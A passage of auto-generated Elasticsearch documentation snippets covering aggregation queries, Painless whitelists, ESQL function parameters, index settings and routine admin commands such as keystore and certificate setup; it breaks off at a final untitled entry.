TITLE: High Precision Geohash Grid with Bounding Box Filter
DESCRIPTION: Shows how to perform a high-precision geohash grid aggregation (precision 8) with a geo_bounding_box filter to limit the search area.

LANGUAGE: console
CODE:
POST /museums/_search?size=0
{
  "aggregations": {
    "zoomed-in": {
      "filter": {
        "geo_bounding_box": {
          "location": {
            "top_left": "POINT (4.9 52.4)",
            "bottom_right": "POINT (5.0 52.3)"
          }
        }
      },
      "aggregations": {
        "zoom1": {
          "geohash_grid": {
            "field": "location",
            "precision": 8
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Installing Elasticsearch Plugin via Proxy (Unix/Linux)
DESCRIPTION: This command demonstrates how to install an Elasticsearch plugin through a proxy on Unix/Linux systems. It uses the CLI_JAVA_OPTS environment variable to set the proxy host and port for both HTTP and HTTPS connections.

LANGUAGE: shell
CODE:
sudo CLI_JAVA_OPTS="-Dhttp.proxyHost=host_name -Dhttp.proxyPort=port_number -Dhttps.proxyHost=host_name -Dhttps.proxyPort=https_port_number" bin/elasticsearch-plugin install analysis-icu

----------------------------------------

TITLE: Parsing Datetime from Milliseconds in Painless
DESCRIPTION: Demonstrates how to parse a datetime string containing milliseconds since epoch into a ZonedDateTime object.

LANGUAGE: painless
CODE:
String milliSinceEpochString = "434931330000";
long milliSinceEpoch = Long.parseLong(milliSinceEpochString);
Instant instant = Instant.ofEpochMilli(milliSinceEpoch);
ZonedDateTime zdt = ZonedDateTime.ofInstant(instant, ZoneId.of('Z'));

----------------------------------------

TITLE: Avoiding PrintWriter.println() in Elasticsearch Java Code
DESCRIPTION: This snippet highlights the issue with using PrintWriter's println() method in Elasticsearch tests on Windows. It recommends using '\n' instead of println() for consistent behavior across different terminal types.

LANGUAGE: Java
CODE:
java.io.PrintWriter#println()
java.io.PrintWriter#println(java.lang.String)

----------------------------------------

TITLE: Including Detailed Description in Markdown
DESCRIPTION: This snippet includes a detailed description of the inequality operator from an external Markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../detailedDescription/not_equals.md
:::

----------------------------------------

TITLE: New Instance Operator in Painless
DESCRIPTION: Shows how to use the new instance operator 'new ()' to allocate reference type instances and call constructors in Painless.

LANGUAGE: painless
CODE:
Map m = new HashMap();
def d = new ArrayList();
def e = new HashMap(m);

----------------------------------------

TITLE: Percentile Ranks Aggregation with Keyed Response Disabled
DESCRIPTION: Shows how to disable the keyed response in a percentile ranks aggregation, returning an array instead of a hash.

LANGUAGE: console
CODE:
GET latency/_search
{
  "size": 0,
  "aggs": {
    "load_time_ranks": {
      "percentile_ranks": {
        "field": "load_time",
        "values": [ 500, 600 ],
        "keyed": false
      }
    }
  }
}

----------------------------------------

TITLE: Defining Supported Types for String Suffix Matching in Elasticsearch
DESCRIPTION: This markdown table defines the supported input types and result type for the string suffix matching function in Elasticsearch. It shows that the function can operate on keyword and text type strings, always returning a boolean result.

LANGUAGE: markdown
CODE:
| str | suffix | result |
| --- | --- | --- |
| keyword | keyword | boolean |
| keyword | text | boolean |
| text | keyword | boolean |
| text | text | boolean |

----------------------------------------

TITLE: Subquery with Group By on Aliased Field in SQL for Elasticsearch
DESCRIPTION: Illustrates a subquery with a GROUP BY clause on an aliased field 'i' from the inner query.

LANGUAGE: sql
CODE:
SELECT i FROM
    (SELECT int AS i FROM test)
GROUP BY i;

----------------------------------------

TITLE: Defining NamedGroupExtractor Class in Painless for Elasticsearch
DESCRIPTION: Declares the NamedGroupExtractor class with a method to extract named groups from a string. This class is marked with @no_import, indicating it's not directly importable in Painless scripts.

LANGUAGE: Painless
CODE:
class org.elasticsearch.runtimefields.NamedGroupExtractor @no_import {
    Map extract(String);
}

----------------------------------------

TITLE: Non-keyed Response in Filters Aggregation
DESCRIPTION: Shows how to use the keyed parameter to return buckets as an array of objects instead of an object, useful for sorting scenarios.

LANGUAGE: console
CODE:
POST /sales/_search?size=0&filter_path=aggregations
{
  "aggs": {
    "the_filter": {
      "filters": {
        "keyed": false,
        "filters": {
          "t-shirt": { "term": { "type": "t-shirt" } },
          "hat": { "term": { "type": "hat" } }
        }
      },
      "aggs": {
        "avg_price": { "avg": { "field": "price" } },
        "sort_by_avg_price": {
          "bucket_sort": { "sort": { "avg_price": "asc" } }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Analyzing Text with Custom Kuromoji Analyzer in Elasticsearch
DESCRIPTION: This snippet shows how to use the _analyze API to test a custom analyzer that uses the kuromoji_tokenizer. It demonstrates analyzing Japanese text with the configured analyzer.

LANGUAGE: json
CODE:
GET kuromoji_sample/_analyze
{
  "analyzer": "my_analyzer",
  "text": "東京スカイツリー"
}

----------------------------------------

TITLE: Defining TemporalAccessor Interface in Java for Painless
DESCRIPTION: Defines the TemporalAccessor interface for accessing temporal objects. It includes methods for querying temporal fields and converting to epoch milliseconds.

LANGUAGE: java
CODE:
class java.time.temporal.TemporalAccessor {
  int get(TemporalField)
  long getLong(TemporalField)
  boolean isSupported(TemporalField)
  def query(TemporalQuery)
  ValueRange range(TemporalField)
  long org.elasticsearch.painless.api.Augmentation toEpochMilli()
  long org.elasticsearch.painless.api.Augmentation getMillis()
}

----------------------------------------

TITLE: ESQL Function Parameter Documentation
DESCRIPTION: Parameter documentation defining the field input requirements for date period expressions.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`field`
:   Input value. The input is a valid constant date period expression.

----------------------------------------

TITLE: Updating Cluster Settings in Elasticsearch Java
DESCRIPTION: This snippet shows how Elasticsearch internally handles dynamic updates to cluster settings. It demonstrates the use of AbstractScopedSettings to track changes and the ClusterApplierService to send setting updates.

LANGUAGE: java
CODE:
private final Map<String, SettingUpdater<?>> settingUpdaters = new HashMap<>();

private void applySettings(Settings settings) {
    for (String key : settings.keySet()) {
        SettingUpdater<?> settingUpdater = settingUpdaters.get(key);
        if (settingUpdater != null) {
            settingUpdater.apply(settings.get(key));
        }
    }
}

----------------------------------------

TITLE: IP Matching Function Parameters Documentation
DESCRIPTION: Documents the parameters used in IP matching functions, supporting both IPv4 and IPv6 addresses for comparison against CIDR blocks.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`ip`
:   IP address of type `ip` (both IPv4 and IPv6 are supported).

`blockX`
:   CIDR block to test the IP against.

----------------------------------------

TITLE: Defining StringFieldScript Class Whitelist in Painless
DESCRIPTION: Whitelists the StringFieldScript class and its Factory for use in Painless scripts without requiring explicit imports. These classes are essential for runtime field functionality in Elasticsearch.

LANGUAGE: painless
CODE:
class org.elasticsearch.script.StringFieldScript @no_import {
}
class org.elasticsearch.script.StringFieldScript$Factory @no_import {
}

----------------------------------------

TITLE: Including COS Function Documentation Sections in Markdown
DESCRIPTION: These snippets include various sections of the COS function documentation using Markdown include directives.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/cos.md
:::

LANGUAGE: markdown
CODE:
:::{include} ../description/cos.md
:::

LANGUAGE: markdown
CODE:
:::{include} ../types/cos.md
:::

LANGUAGE: markdown
CODE:
:::{include} ../examples/cos.md
:::

----------------------------------------

TITLE: Markdown Warning Block for CATEGORIZE Function
DESCRIPTION: A warning block in Markdown format, indicating that the CATEGORIZE function is in technical preview and should not be used in production environments.

LANGUAGE: markdown
CODE:
::::{warning}
Do not use on production environments. This functionality is in technical preview and
may be changed or removed in a future release. Elastic will work to fix any issues, but features in technical preview
are not subject to the support SLA of official GA features.
::::

----------------------------------------

TITLE: Parameter Documentation for Spatial Types in ESQL
DESCRIPTION: Documents the 'point' parameter that accepts various spatial data types including geo_point, geo_shape, cartesian_point and cartesian_shape. The parameter is nullable and returns null when null input is provided.

LANGUAGE: markdown
CODE:
**Parameters**

`point`
:   Expression of type `geo_point`, `geo_shape`, `cartesian_point` or `cartesian_shape`. If `null`, the function returns `null`.

----------------------------------------

TITLE: Indexing a GeoJSON Polygon with Hole in Elasticsearch
DESCRIPTION: Example of indexing a polygon with a hole using GeoJSON format in the geo_shape field.

LANGUAGE: console
CODE:
POST /example/_doc
{
  "location" : {
    "type" : "Polygon",
    "coordinates" : [
      [ [100.0, 0.0], [101.0, 0.0], [101.0, 1.0], [100.0, 1.0], [100.0, 0.0] ],
      [ [100.2, 0.2], [100.8, 0.2], [100.8, 0.8], [100.2, 0.8], [100.2, 0.2] ]
    ]
  }
}

----------------------------------------

TITLE: Customizing Lowercase Filter for Greek Language in Elasticsearch
DESCRIPTION: This snippet demonstrates how to create a custom lowercase filter specifically for the Greek language using the create index API.

LANGUAGE: console
CODE:
PUT custom_lowercase_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "greek_lowercase_example": {
          "type": "custom",
          "tokenizer": "standard",
          "filter": ["greek_lowercase"]
        }
      },
      "filter": {
        "greek_lowercase": {
          "type": "lowercase",
          "language": "greek"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Running SecurityManager Scanner Tool with Gradle
DESCRIPTION: Shell command to execute the SecurityManager scanner tool using Gradle. This command runs the tool and generates a CSV output file containing the scan results.

LANGUAGE: shell
CODE:
./gradlew :libs:entitlement:tools:securitymanager-scanner:run

----------------------------------------

TITLE: Indexing Parent Question Document
DESCRIPTION: Indexes a question document as a parent document with tags and content.

LANGUAGE: console
CODE:
PUT child_example/_doc/1
{
  "join": {
    "name": "question"
  },
  "body": "<p>I have Windows 2003 server and i bought a new Windows 2008 server...",
  "title": "Whats the best way to file transfer my site from server to a newer one?",
  "tags": [
    "windows-server-2003",
    "windows-server-2008",
    "file-transfer"
  ]
}

----------------------------------------

TITLE: Defining AttributedCharacterIterator.Attribute Class in Java
DESCRIPTION: Defines the Attribute nested class within AttributedCharacterIterator with constant fields.

LANGUAGE: java
CODE:
class java.text.AttributedCharacterIterator$Attribute {
  AttributedCharacterIterator.Attribute INPUT_METHOD_SEGMENT
  AttributedCharacterIterator.Attribute LANGUAGE
  AttributedCharacterIterator.Attribute READING
}

----------------------------------------

TITLE: Analyzing Japanese Text with Kuromoji Completion Filter
DESCRIPTION: Demonstrates the usage of kuromoji_completion analyzer to generate both original and romanized tokens from Japanese text. The example shows how '寿司' (sushi) gets analyzed to produce the original token plus romanized versions in Kunrei-shiki (susi) and Hepburn-shiki (sushi) formats.

LANGUAGE: console
CODE:
GET _analyze
{
  "analyzer": "kuromoji_completion",
  "text": "寿司"
}

----------------------------------------

TITLE: Assigning Index to Nodes Using Custom Attribute
DESCRIPTION: Shows how to create an ILM policy that assigns an index to nodes with specific box_type attributes (hot or warm) during the warm phase.

LANGUAGE: json
CODE:
PUT _ilm/policy/my_policy
{
  "policy": {
    "phases": {
      "warm": {
        "actions": {
          "allocate" : {
            "include" : {
              "box_type": "hot,warm"
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Sample Response for Reverse Nested Aggregation in Elasticsearch
DESCRIPTION: This snippet shows a possible response structure for a reverse nested aggregation query. It includes aggregations for comments, top usernames, and top tags per comment.

LANGUAGE: console-result
CODE:
{
  "aggregations": {
    "comments": {
      "doc_count": 1,
      "top_usernames": {
        "doc_count_error_upper_bound" : 0,
        "sum_other_doc_count" : 0,
        "buckets": [
          {
            "key": "username_1",
            "doc_count": 1,
            "comment_to_issue": {
              "doc_count": 1,
              "top_tags_per_comment": {
                "doc_count_error_upper_bound" : 0,
                "sum_other_doc_count" : 0,
                "buckets": [
                  {
                    "key": "tag_1",
                    "doc_count": 1
                  }
                  ...
                ]
              }
            }
          }
          ...
        ]
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Index Alias with Rollover Settings
DESCRIPTION: Example showing how to configure an index with the required settings and aliases for rollover functionality.

LANGUAGE: json
CODE:
PUT my-index-000001
{
  "settings": {
    "index.lifecycle.name": "my_policy",
    "index.lifecycle.rollover_alias": "my_data"
  },
  "aliases": {
    "my_data": {
      "is_write_index": true
    }
  }
}

----------------------------------------

TITLE: Configuring Lowercase Processor in Elasticsearch
DESCRIPTION: This snippet demonstrates how to configure the Lowercase processor in Elasticsearch. The processor converts the specified field 'foo' to lowercase. It's a simple configuration that can be extended with additional options as needed.

LANGUAGE: js
CODE:
{
  "lowercase": {
    "field": "foo"
  }
}

----------------------------------------

TITLE: Creating Version String with CONCAT and Type Casting in ESQL
DESCRIPTION: Demonstrates construction of a version number by converting an integer to string, concatenating with version components, and casting to VERSION type. Shows type casting from INT to STRING and final casting to VERSION type.

LANGUAGE: esql
CODE:
ROW ver = CONCAT(("0"::INT + 1)::STRING, ".2.3")::VERSION

----------------------------------------

TITLE: Declaring and Using Primitive Types in Painless
DESCRIPTION: Examples of declaring primitive type variables and using method calls on primitive types using their corresponding reference types.

LANGUAGE: painless
CODE:
int i = 1;
double d;
boolean b = true;

int i = 1;
i.toString();

----------------------------------------

TITLE: Defining a Derivative Aggregation in Elasticsearch
DESCRIPTION: Shows the basic syntax for defining a derivative aggregation, specifying the buckets_path parameter to indicate which metric to calculate the derivative for.

LANGUAGE: js
CODE:
"derivative": {
  "buckets_path": "the_sum"
}

----------------------------------------

TITLE: Creating an Index with Synthetic Source for Version Fields
DESCRIPTION: This snippet shows how to create an index with synthetic _source enabled and a version field. It includes settings for the index mapping and source mode, as well as the field definition.

LANGUAGE: console
CODE:
PUT idx
{
  "settings": {
    "index": {
      "mapping": {
        "source": {
          "mode": "synthetic"
        }
      }
    }
  },
  "mappings": {
    "properties": {
      "versions": { "type": "version" }
    }
  }
}

----------------------------------------

TITLE: Calculating LOG10 Using ESQL
DESCRIPTION: Demonstrates calculating the base-10 logarithm of a number using the LOG10 function in ESQL. Takes a double value of 1000.0 and returns its base-10 logarithm which is 3.0.

LANGUAGE: esql
CODE:
ROW d = 1000.0
| EVAL s = LOG10(d)

----------------------------------------

TITLE: Defining Annotation Class in Java
DESCRIPTION: Defines the Annotation class for text attributes with a constructor and getValue method.

LANGUAGE: java
CODE:
class java.text.Annotation {
  (Object)
  def getValue()
}

----------------------------------------

TITLE: Defining Parameters for ESQL Duration Parsing Function Test
DESCRIPTION: This snippet defines the parameters for an ESQL function test case. It specifies a single parameter 'field' which represents the input value, expected to be a valid constant time duration expression.

LANGUAGE: markdown
CODE:
**Parameters**

`field`
:   Input value. The input is a valid constant time duration expression.

----------------------------------------

TITLE: MathContext Class Definition in Painless
DESCRIPTION: Defines the MathContext class structure with its constants and methods for specifying precision and rounding mode in decimal arithmetic operations.

LANGUAGE: java
CODE:
class java.math.MathContext {
  MathContext DECIMAL128
  MathContext DECIMAL32
  MathContext DECIMAL64
  MathContext UNLIMITED
  (int)
  (int,RoundingMode)
  int getPrecision()
  RoundingMode getRoundingMode()
}

----------------------------------------

TITLE: ESQL String Parameter Documentation
DESCRIPTION: Documents a string parameter for an ESQL function. Specifies that the parameter accepts string expressions and returns null if the input is null.

LANGUAGE: markdown
CODE:
`string`
:   String expression. If `null`, the function returns `null`.

----------------------------------------

TITLE: Describing MOD Function in Elasticsearch SQL
DESCRIPTION: The MOD function divides one number by another and returns the remainder. If either input field is multivalued, the function returns null. This function is part of Elasticsearch SQL's mathematical operations.

LANGUAGE: markdown
CODE:
### MOD
Divide one number by another and return the remainder. If either field is <<esql-multivalued-fields,multivalued>> then the result is `null`.

----------------------------------------

TITLE: Specifying Temp File/Directory Location in Java
DESCRIPTION: This snippet advises specifying a location when creating temporary files or directories using java.nio.file.Files methods.

LANGUAGE: java
CODE:
@defaultMessage Specify a location for the temp file/directory instead.
java.nio.file.Files#createTempDirectory(java.lang.String,java.nio.file.attribute.FileAttribute[])
java.nio.file.Files#createTempFile(java.lang.String,java.lang.String,java.nio.file.attribute.FileAttribute[])

----------------------------------------

TITLE: Markdown Image Inclusion for CATEGORIZE Function Syntax
DESCRIPTION: Markdown code to include an image representing the syntax diagram for the CATEGORIZE function in ESQL.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/functions/categorize.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Chrono Interface Definitions
DESCRIPTION: Core interfaces defining chronological date and time operations in Java. Includes ChronoLocalDate, ChronoLocalDateTime, Chronology, ChronoPeriod, ChronoZonedDateTime, and Era interfaces.

LANGUAGE: java
CODE:
class java.time.chrono.ChronoLocalDate {
  ChronoLocalDateTime atTime(LocalTime)
  int compareTo(ChronoLocalDate)
  boolean equals(Object)
  String format(DateTimeFormatter)
  ChronoLocalDate from(TemporalAccessor)
  Chronology getChronology()
  Era getEra()
  int hashCode()
  boolean isAfter(ChronoLocalDate)
  boolean isBefore(ChronoLocalDate)
  boolean isEqual(ChronoLocalDate)
  boolean isLeapYear()
  int lengthOfMonth()
  int lengthOfYear()
  ChronoLocalDate minus(TemporalAmount)
  ChronoLocalDate minus(long,TemporalUnit)
  ChronoLocalDate plus(TemporalAmount)
  ChronoLocalDate plus(long,TemporalUnit)
  Comparator timeLineOrder()
  long toEpochDay()
  String toString()
  ChronoPeriod until(ChronoLocalDate)
  ChronoLocalDate with(TemporalAdjuster)
  ChronoLocalDate with(TemporalField,long)
}

----------------------------------------

TITLE: COALESCE Function Comment Header
DESCRIPTION: Header comment indicating this is auto-generated documentation for the COALESCE function

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: Documenting ESQL Function Parameters in Markdown
DESCRIPTION: This snippet defines the parameters for an ESQL function using Markdown syntax. It specifies a single 'string' parameter and describes its behavior, including null handling.

LANGUAGE: markdown
CODE:
**Parameters**

`string`
:   String expression. If `null`, the function returns `null`.

----------------------------------------

TITLE: Defining Parameters for ESQL String Splitting Function
DESCRIPTION: Specifies two parameters for an ESQL string splitting function: a multivalue expression string and a delimiter. This snippet is part of a generated test case and should not be manually edited.

LANGUAGE: plaintext
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`string`
:   Multivalue expression.

`delim`
:   Delimiter.

----------------------------------------

TITLE: Retrieving Mapping with Preserved Dot Notation in Elasticsearch
DESCRIPTION: This snippet shows the result of retrieving the mapping for an index where 'subobjects: false' is set. It demonstrates how dot notation in field names is preserved in the mapping.

LANGUAGE: console-result
CODE:
{
  "my-index-000001" : {
    "mappings" : {
      "properties" : {
        "metrics" : {
          "subobjects" : false,
          "properties" : {
            "time" : {
              "type" : "long"
            },
            "time.min" : {
              "type" : "long"
            },
            "time.max" : {
              "type" : "long"
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: IP Range Aggregation with CIDR Masks in Elasticsearch
DESCRIPTION: This example shows how to use CIDR masks in IP range aggregations. It defines two ranges using the masks 10.0.0.0/25 and 10.0.0.127/25.

LANGUAGE: console
CODE:
GET /ip_addresses/_search
{
  "size": 0,
  "aggs": {
    "ip_ranges": {
      "ip_range": {
        "field": "ip",
        "ranges": [
          { "mask": "10.0.0.0/25" },
          { "mask": "10.0.0.127/25" }
        ]
      }
    }
  }
}

----------------------------------------

TITLE: String Function Parameter Documentation in ESQL
DESCRIPTION: Documents two parameters for an ESQL function: 'str' which accepts a string expression and returns null if input is null, and 'prefix' which also accepts a string expression and returns null if input is null.

LANGUAGE: markdown
CODE:
`str`
:   String expression. If `null`, the function returns `null`.

`prefix`
:   String expression. If `null`, the function returns `null`.

----------------------------------------

TITLE: Basic STD_DEV Calculation in ESQL
DESCRIPTION: Calculates the standard deviation of the 'height' column from the employees table. Returns a single value representing the statistical spread of height values.

LANGUAGE: esql
CODE:
FROM employees
| STATS STD_DEV(height)

----------------------------------------

TITLE: Configuring Elasticsearch Keystore for SSL Key Passphrase
DESCRIPTION: Command to add the private key's passphrase to the Elasticsearch keystore for secure SSL configuration. This step is necessary only if the private key is password-protected.

LANGUAGE: shell
CODE:
elasticsearch-keystore add "xpack.security.http.ssl.secure_key_passphrase"

----------------------------------------

TITLE: Including TO_LOWER Function Examples in Markdown
DESCRIPTION: This snippet includes usage examples for the TO_LOWER function from a separate markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../examples/to_lower.md
:::

----------------------------------------

TITLE: Using Custom MessageDigests in Elasticsearch
DESCRIPTION: Recommends using org.elasticsearch.common.hash.MessageDigests instead of java.security.MessageDigest#clone() for message digest operations.

LANGUAGE: java
CODE:
java.security.MessageDigest#clone() @ use org.elasticsearch.common.hash.MessageDigests

----------------------------------------

TITLE: Calendar System Implementations
DESCRIPTION: Concrete implementations of different calendar systems including Hijrah, Japanese, Minguo, and Thai Buddhist calendars. Each implementation provides specific date handling and era management.

LANGUAGE: java
CODE:
class java.time.chrono.HijrahChronology {
  HijrahChronology INSTANCE
  HijrahDate date(TemporalAccessor)
  HijrahDate date(int,int,int)
  HijrahDate date(Era,int,int,int)
  HijrahDate dateEpochDay(long)
  HijrahDate dateYearDay(int,int)
  HijrahDate dateYearDay(Era,int,int)
  HijrahEra eraOf(int)
  HijrahDate resolveDate(Map,ResolverStyle)
}

----------------------------------------

TITLE: Previous HTTP Configuration Example
DESCRIPTION: Example of the default non-secure HTTP configuration that needs to be replaced.

LANGUAGE: yaml
CODE:
elasticsearch.hosts: [ "http://localhost:9200" ]

----------------------------------------

TITLE: Creating Annotated Text Mapping in Elasticsearch
DESCRIPTION: Demonstrates how to create an index mapping with an annotated_text field type that allows both text and structured token indexing.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "my_field": {
        "type": "annotated_text"
      }
    }
  }
}

----------------------------------------

TITLE: Significant Text Aggregation with Custom Background Filter in Elasticsearch
DESCRIPTION: This query uses a background filter to focus on significant terms within a narrower context, specifically terms related to Madrid within documents mentioning Spain.

LANGUAGE: console
CODE:
GET news/_search
{
  "query": {
    "match": {
      "content": "madrid"
    }
  },
  "aggs": {
    "tags": {
      "significant_text": {
        "field": "content",
        "background_filter": {
          "term": { "content": "spain" }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Converting JKS to PKCS12 Format
DESCRIPTION: Commands to convert the JKS keystore to PKCS12 format, including both single-entry and multi-entry conversions. Uses keytool's importkeystore command with specific source and destination parameters.

LANGUAGE: bash
CODE:
keytool -importkeystore -srckeystore multi_signing.jks  -destkeystore signing.p12 -deststoretype PKCS12 -deststorepass signing -destkeypass signing -alias signing1

keytool -importkeystore -srckeystore multi_signing.jks  -destkeystore multi_signing.p12 -deststoretype PKCS12 -deststorepass signing -destkeypass signing

----------------------------------------

TITLE: Querying Available Ingest Processors in Elasticsearch
DESCRIPTION: This API call retrieves a list of available ingest processors from Elasticsearch nodes. It uses the nodes info API with a filter to show only ingest processor information.

LANGUAGE: console
CODE:
GET _nodes/ingest?filter_path=nodes.*.ingest.processors

----------------------------------------

TITLE: ESQL Weighted Numeric Parameter Documentation
DESCRIPTION: Documentation for two parameters: 'number' representing a numeric value, and 'weight' defining a numeric weight to be applied.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`number`
:   A numeric value.

`weight`
:   A numeric weight.

----------------------------------------

TITLE: Do-While Loop in Painless
DESCRIPTION: Do-while loop implementation that executes block at least once before checking condition on document source fields.

LANGUAGE: painless
CODE:
do {
  // do something
}
while (ctx._source.item < condition)

----------------------------------------

TITLE: Running Box Connector Docker Container
DESCRIPTION: Shell command to run the Box connector Docker container

LANGUAGE: bash
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Geometric Type Support Matrix in ESQL
DESCRIPTION: Markdown table showing valid geometric type combinations for comparison operations. Supports both Cartesian (point/shape) and geographic (point/shape) coordinate systems. Each combination returns a boolean result.

LANGUAGE: markdown
CODE:
| geomA | geomB | result |
| --- | --- | --- |
| cartesian_point | cartesian_point | boolean |
| cartesian_point | cartesian_shape | boolean |
| cartesian_shape | cartesian_point | boolean |
| cartesian_shape | cartesian_shape | boolean |
| geo_point | geo_point | boolean |
| geo_point | geo_shape | boolean |
| geo_shape | geo_point | boolean |
| geo_shape | geo_shape | boolean |

----------------------------------------

TITLE: License Application Boilerplate Text
DESCRIPTION: Standard boilerplate notice text for applying the Apache License 2.0 to a software project. Includes placeholders for copyright year and owner information.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Running Specific Elasticsearch Microbenchmark
DESCRIPTION: Command to run a specific microbenchmark class (MemoryStatsBenchmark) using Gradle and JMH arguments.

LANGUAGE: bash
CODE:
gradlew -p benchmarks run --args 'MemoryStatsBenchmark'

----------------------------------------

TITLE: Executing ESVectorUtilTests
DESCRIPTION: Runs tests for ESVectorUtil, including bit operations and vector comparisons.

LANGUAGE: text
CODE:
[2024-12-23T20:52:41,275][INFO ][o.e.s.ESVectorUtilTests  ] [testBitAndCount] before test
[2024-12-23T20:52:41,282][INFO ][o.e.s.i.v.ESVectorizationProvider] [testBitAndCount] Java vector incubator API enabled; uses preferredBitSize=128
// ... more test executions ...
[2024-12-23T20:52:41,508][INFO ][o.e.s.ESVectorUtilTests  ] [testIpFloatBit] after test

----------------------------------------

TITLE: Parameter Definition in Markdown
DESCRIPTION: Defines a 'number' parameter specification that accepts multivalue expressions.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`number`
:   Multivalue expression.

----------------------------------------

TITLE: ESQL COUNT Function Documentation Structure
DESCRIPTION: Markdown structure defining the documentation layout for the COUNT function, including sections for syntax, parameters, description, types and examples. Generated automatically by the test framework.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

## `COUNT` [esql-count]

**Syntax**

:::{image} ../../../images/functions/count.svg
:alt: Embedded
:class: text-center
:::


:::{include} ../parameters/count.md
:::

:::{include} ../description/count.md
:::

:::{include} ../types/count.md
:::

:::{include} ../examples/count.md
:::

----------------------------------------

TITLE: Documenting ESQL Function Parameter in Markdown
DESCRIPTION: This snippet defines the 'field' parameter for an ESQL function. It specifies that the parameter is a multivalue expression.

LANGUAGE: markdown
CODE:
`field`
:   Multivalue expression.

----------------------------------------

TITLE: Generating RSA 1024-bit Keypair Certificate for Elasticsearch
DESCRIPTION: This command uses elasticsearch-certutil to generate a 1024-bit RSA keypair certificate. It specifies a validity period of 54321 days and sets a different subject name for the certificate.

LANGUAGE: bash
CODE:
elasticsearch-certutil cert --pem --out ${PWD}/keypair-rsa-1024.zip --days 54321 --keysize 1024 --name "CN=test-1024,OU=idp,DC=elasticsearch,DC=org"

----------------------------------------

TITLE: Monitoring Cache Statistics
DESCRIPTION: Examples of API calls to monitor cache usage statistics, including both index-level and node-level stats.

LANGUAGE: console
CODE:
GET /_stats/request_cache?human

LANGUAGE: console
CODE:
GET /_nodes/stats/indices/request_cache?human

----------------------------------------

TITLE: Markdown Documentation Structure
DESCRIPTION: Basic markdown structure for WEIGHTED_AVG function documentation, showing section headers and image inclusion.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

## `WEIGHTED_AVG` [esql-weighted_avg]

**Syntax**

:::{image} ../../../images/functions/weighted_avg.svg
:alt: Embedded
:class: text-center
:::

:::{include} ../parameters/weighted_avg.md
:::

:::{include} ../description/weighted_avg.md
:::

:::{include} ../types/weighted_avg.md
:::

:::{include} ../examples/weighted_avg.md
:::

----------------------------------------

TITLE: Defining COUNT_DISTINCT_APPROXIMATE Parameters in Markdown
DESCRIPTION: This snippet defines the parameters for the COUNT_DISTINCT_APPROXIMATE function in ESQL. It specifies the 'field' parameter for counting distinct values and the 'precision' parameter for setting the precision threshold.

LANGUAGE: markdown
CODE:
**Parameters**

`field`
:   Column or literal for which to count the number of distinct values.

`precision`
:   Precision threshold. Refer to [`AGG-COUNT-DISTINCT-APPROXIMATE`](/reference/query-languages/esql/esql-functions-operators.md#esql-agg-count-distinct-approximate). The maximum supported value is 40000. Thresholds above this number will have the same effect as a threshold of 40000. The default value is 3000.

----------------------------------------

TITLE: Using TO_CHAR Function
DESCRIPTION: Examples of using TO_CHAR function to format dates and times as strings using PostgreSQL template patterns.

LANGUAGE: sql
CODE:
SELECT TO_CHAR(CAST('2020-04-05' AS DATE), 'DD/MM/YYYY') AS "date";

LANGUAGE: sql
CODE:
SELECT TO_CHAR(CAST('2020-04-05T11:22:33.987654' AS DATETIME), 'DD/MM/YYYY HH24:MI:SS.FF2') AS "datetime";

LANGUAGE: sql
CODE:
SELECT TO_CHAR(CAST('23:22:33.987' AS TIME), 'HH12 MI SS.FF1') AS "time";

----------------------------------------

TITLE: Configuring HDFS Repository Directory Structure
DESCRIPTION: Shows the expected directory structure for placing Kerberos keytab files in Elasticsearch configuration.

LANGUAGE: bash
CODE:
$> cd elasticsearch/config
$> ls
elasticsearch.yml  jvm.options        log4j2.properties  repository-hdfs/   scripts/
$> cd repository-hdfs
$> ls
krb5.keytab

----------------------------------------

TITLE: Source Filtering with Field Alias (Unsupported)
DESCRIPTION: Example showing that source filtering does not work with field aliases, resulting in an empty source response.

LANGUAGE: console
CODE:
GET /_search
{
  "query" : {
    "match_all": {}
  },
  "_source": "route_length_miles"
}

----------------------------------------

TITLE: Defining VersionStringDocValuesField Class in Java
